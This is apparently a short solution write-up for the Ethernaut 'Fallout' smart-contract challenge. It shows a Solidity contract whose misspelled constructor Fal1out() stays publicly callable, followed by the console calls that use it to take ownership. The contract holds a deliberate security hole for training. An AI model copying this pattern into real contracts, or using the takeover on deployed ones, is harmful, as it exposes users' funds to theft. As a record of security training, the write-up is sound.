<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel2.svg">

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```
We must be owner of the contract for solve this challenge. So call ```Fal1out()``` which will help us to be owner.
```shell
await contract.owner()
'0x0000000000000000000000000000000000000000'

await contract.Fal1out()
{tx: '0xbc90077761d69b097caf909e42d43568bd232f557f4906efb3e6f56fe9fadb1e', receipt: {…}, logs: Array(0)}
```
Check again who owner is.

```
await contract.owner()
'0x0C39eb3D6C0583AdA92e15C9e7610B609BBdF35b'
```

**_by wasny0ps_**
